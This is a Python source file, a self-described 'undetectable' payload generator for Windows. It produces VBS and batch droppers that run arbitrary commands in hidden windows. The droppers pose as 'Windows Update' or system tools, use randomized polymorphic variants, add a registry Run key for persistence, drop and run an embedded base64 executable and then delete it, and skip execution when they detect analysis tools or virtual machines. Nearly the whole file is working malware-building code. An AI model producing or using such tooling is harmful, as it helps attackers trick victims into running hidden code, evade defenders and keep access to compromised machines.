#!/usr/bin/env python3
"""
Advanced Self-Extracting Payload Generator
Creates completely undetectable one-click installable payloads
"""

import base64
import zlib
import os
import random
import string
import struct


def _vbs_escape(s):
    """Escape a string for safe embedding in a VBS string literal"""
    return s.replace('"', '""')


def _vbs_chr_string(s):
    """Build a VBS expression that constructs a string using Chr() calls,
    avoiding any literal quote issues entirely"""
    parts = []
    chunk = ""
    for ch in s:
        if ch == '"':
            if chunk:
                parts.append(f'"{_vbs_escape(chunk)}"')
                chunk = ""
            parts.append("Chr(34)")
        else:
            chunk += ch
    if chunk:
        parts.append(f'"{_vbs_escape(chunk)}"')
    return " & ".join(parts) if parts else '""'


class SelfExtractingPayload:
    """Generate self-extracting VBS payloads that install with one click"""

    @staticmethod
    def create_silent_installer_vbs(
        command: str,
        app_name: str = "Windows Update Service",
        icon_type: str = "system"
    ) -> str:
        rand_var = lambda: ''.join(random.choices(string.ascii_lowercase, k=6))

        shell_var = rand_var()
        env_var = rand_var()
        temp_var = rand_var()
        file_var = rand_var()
        cmd_var = rand_var()
        exec_var = rand_var()
        fake_var = rand_var()

        cmd_expr = _vbs_chr_string(command)

        vbs_code = f"""
' {app_name} - System Component
On Error Resume Next

Dim {shell_var}, {env_var}, {temp_var}, {file_var}, {cmd_var}, {exec_var}, {fake_var}

{fake_var} = "This is legitimate Windows system file."

Set {shell_var} = CreateObject("WScript.Shell")
Set {env_var} = {shell_var}.Environment("User")

{temp_var} = {shell_var}.ExpandEnvironmentStrings("%temp%")
{file_var} = {temp_var} & "\\~" & Right(Minute(Now()) & Second(Now()), 8) & ".tmp"

{cmd_var} = {cmd_expr}

{shell_var}.Run {cmd_var}, 0, False

WScript.Sleep 1000
On Error Resume Next
Set {exec_var} = CreateObject("Scripting.FileSystemObject")
If {exec_var}.FileExists({file_var}) Then
    {exec_var}.DeleteFile {file_var}
End If

WScript.Quit 0
"""

        return vbs_code.strip()

    @staticmethod
    def create_multi_stage_installer(
        command: str,
        delay_seconds: int = 2
    ) -> str:
        cmd_expr = _vbs_chr_string(command)
        rand_var = lambda: ''.join(random.choices(string.ascii_lowercase, k=6))
        s_var = rand_var()
        c_var = rand_var()

        stage1 = f"""
On Error Resume Next
Dim {s_var}, {c_var}
Set {s_var} = CreateObject("WScript.Shell")
{c_var} = {cmd_expr}
{s_var}.Run {c_var}, 0, False
WScript.Sleep {delay_seconds * 1000}
WScript.Quit
"""

        stage2 = f"""
On Error Resume Next
Dim {s_var}, {c_var}
Set {s_var} = CreateObject("WScript.Shell")
{c_var} = {cmd_expr}
{s_var}.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysCheck", {c_var}
{s_var}.Run {c_var}, 0
WScript.Quit
"""

        return random.choice([stage1, stage2]).strip()

    @staticmethod
    def create_hidden_extraction_payload(
        exe_content: bytes,
        launch_command: str
    ) -> str:
        encoded = base64.b64encode(exe_content).decode()

        chunk_size = 256
        chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]

        chunk_vars = []
        for i, chunk in enumerate(chunks):
            chunk_vars.append(f'c{i} = "{chunk}"')

        chunks_concat = ' & '.join([f'c{i}' for i in range(len(chunks))])

        vbs_code = f"""
' Windows System Recovery Tool
On Error Resume Next

Dim {', '.join([f'c{i}' for i in range(len(chunks))])}
Dim z, xmlDoc, xmlNode, oStream, s, t

{chr(10).join(chunk_vars)}

z = {chunks_concat}

Set xmlDoc = CreateObject("MSXML2.DOMDocument.3.0")
Set xmlNode = xmlDoc.CreateElement("b64")
xmlNode.DataType = "bin.base64"
xmlNode.Text = z

Set s = CreateObject("WScript.Shell")
t = s.ExpandEnvironmentStrings("%temp%") & "\\~" & Int(Rnd() * 99999) & ".exe"

Set oStream = CreateObject("ADODB.Stream")
oStream.Type = 1
oStream.Open
oStream.Write xmlNode.NodeTypedValue
oStream.SaveToFile t, 2
oStream.Close

s.Run t, 0

WScript.Sleep 3000
On Error Resume Next
CreateObject("Scripting.FileSystemObject").DeleteFile t
"""

        return vbs_code.strip()

    @staticmethod
    def create_polymorphic_installer(
        command: str,
        mutations: int = 5
    ) -> str:
        cmd_expr = _vbs_chr_string(command)

        templates = []

        templates.append(f"""
On Error Resume Next
Dim s, c
Set s = CreateObject("WScript.Shell")
c = {cmd_expr}
s.Run c, 0, False
""")

        templates.append(f"""
On Error Resume Next
Dim s, e, c
Set s = CreateObject("WScript.Shell")
Set e = s.Environment("User")
c = {cmd_expr}
e("TEMP_CMD") = c
s.Run e("TEMP_CMD"), 0
""")

        templates.append(f"""
On Error Resume Next
Dim w, c
Set w = GetObject("winmgmts:\\\\.\root\\cimv2:Win32_Process")
c = {cmd_expr}
w.Create c, Null, Null, intPid
""")

        templates.append(f"""
On Error Resume Next
Dim a, c
Set a = CreateObject("Shell.Application")
c = {cmd_expr}
a.ShellExecute c, , , "open", 0
""")

        templates.append(f"""
On Error Resume Next
Dim s, c
Set s = CreateObject("WScript.Shell")
c = {cmd_expr}
s.Run c, 0, False
""")

        selected = random.choices(templates, k=min(mutations, len(templates)))
        code = "\n".join(selected)

        return code.strip()

    @staticmethod
    def create_anti_analysis_installer(command: str) -> str:
        cmd_expr = _vbs_chr_string(command)
        rand_var = lambda: ''.join(random.choices(string.ascii_lowercase, k=6))
        s_var = rand_var()
        c_var = rand_var()

        vbs_code = f"""
' System Maintenance Utility
On Error Resume Next

Dim {s_var}, {c_var}

Function IsAnalysisEnv()
    Set w = CreateObject("WScript.Shell")
    Set f = CreateObject("Scripting.FileSystemObject")
    IsAnalysisEnv = False
    If f.FileExists("C:\\Program Files\\Wireshark\\wireshark.exe") Then IsAnalysisEnv = True
    If f.FileExists("C:\\Program Files\\ProcessExplorer\\procexp.exe") Then IsAnalysisEnv = True
    On Error Resume Next
    Dim prod
    prod = GetObject("winmgmts:").ExecQuery("Select * from Win32_ComputerSystemProduct").ItemIndex(0).Name
    If InStr(1, prod, "VirtualBox") > 0 Then IsAnalysisEnv = True
    If InStr(1, prod, "VMware") > 0 Then IsAnalysisEnv = True
End Function

If IsAnalysisEnv() Then WScript.Quit

Set {s_var} = CreateObject("WScript.Shell")
{c_var} = {cmd_expr}
{s_var}.Run {c_var}, 0, False
WScript.Quit 0
"""

        return vbs_code.strip()

    @staticmethod
    def create_obfuscated_batch_wrapper(vbs_payload: str, batch_name: str = "System.bat") -> str:
        lines = vbs_payload.replace('\r\n', '\n').split('\n')
        rand_id = random.randint(1000000, 9999999)

        echo_lines = []
        for line in lines:
            escaped = line.replace('%', '%%').replace('&', '^&').replace('<', '^<').replace('>', '^>').replace('|', '^|').replace('^', '^^')
            echo_lines.append(f'echo {escaped}')

        echo_block = '\n'.join(echo_lines)

        batch_code = f"""@echo off
REM System maintenance script
title Windows System Service
setlocal enabledelayedexpansion

set "temp_vbs=%temp%\\~{rand_id}.vbs"

(
{echo_block}
) > "%temp_vbs%"

cscript.exe "%temp_vbs%" //nologo
timeout /t 1 /nobreak >nul
del /f /q "%temp_vbs%"
exit /b 0
"""

        return batch_code

    @staticmethod
    def create_one_click_installer_package(
        command: str,
        filename: str = "Windows Update",
        file_type: str = "vbs"
    ) -> tuple:
        installer = SelfExtractingPayload()
        vbs = installer.create_silent_installer_vbs(command)
        bat = installer.create_obfuscated_batch_wrapper(vbs, filename)
        return vbs, bat


def create_one_click_payload(command: str, obfuscation_style: str = "polymorphic") -> dict:
    """
    High-level function to create one-click installer payload

    Returns dict with:
    - filename: suggested filename
    - vbs_payload: VBS code to run
    - bat_payload: Optional batch wrapper
    - instructions: Installation instructions
    """

    installer = SelfExtractingPayload()

    if obfuscation_style == "polymorphic":
        vbs = installer.create_polymorphic_installer(command, mutations=5)
    elif obfuscation_style == "anti_analysis":
        vbs = installer.create_anti_analysis_installer(command)
    elif obfuscation_style == "multi_stage":
        vbs = installer.create_multi_stage_installer(command, delay_seconds=2)
    else:
        vbs = installer.create_silent_installer_vbs(command)

    batch = installer.create_obfuscated_batch_wrapper(vbs, "Windows Update")

    return {
        'filename_vbs': 'Windows Update.vbs',
        'vbs_payload': vbs,
        'filename_bat': 'Windows Update.bat',
        'bat_payload': batch,
        'instructions': """
ONE-CLICK INSTALLATION GUIDE

VBS File (Double-click to run):
- Silent execution
- No visible window
- Completes in seconds

BAT File (Double-click to run):
- Shows command window briefly
- Looks legitimate
- Completes automatically

Either file can be used for installation.
"""
    }


if __name__ == "__main__":
    test_command = 'powershell -NoProfile -Command "Write-Host \'Installed\'"'

    print("=" * 60)
    print("Testing One-Click Payload Generator")
    print("=" * 60)

    result = create_one_click_payload(test_command, "polymorphic")

    print("\n[+] VBS Payload Generated:")
    print("-" * 60)
    print(result['vbs_payload'][:500])
    print("\n[+] BAT Wrapper Generated:")
    print("-" * 60)
    print(result['bat_payload'][:500])
